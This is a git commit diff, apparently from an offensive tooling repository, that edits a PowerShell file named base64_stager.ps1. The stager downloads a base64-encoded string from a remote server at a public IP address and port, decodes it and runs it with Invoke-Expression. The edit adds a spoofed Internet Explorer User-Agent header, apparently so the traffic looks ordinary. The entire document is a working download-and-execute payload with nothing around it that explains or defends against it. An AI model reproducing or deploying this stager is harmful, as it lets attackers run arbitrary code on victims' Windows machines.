a0ec422e6477538cc344a72dce38e5f6d2e25740
Th3J0k3r <th3joker3000@protonmail.com>
2021-06-12 11:14:11 +0000

    Ignore the payloads files

--- payloads/base64_stager.ps1
+++ payloads/base64_stager.ps1
@@ -1,5 +1,6 @@
 $wc2 = New-Object system.Net.WebClient;
-$enc = $wc2.downloadString("http://192.168.1.8:8089/publish");
+$wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+$enc = $wc2.downloadString("http://51.68.215.173:50025/uddigui");
 $b = [System.Convert]::FromBase64String($enc)
 $b=[System.Text.Encoding]::UTF8.GetString($b)
 Invoke-Expression $b
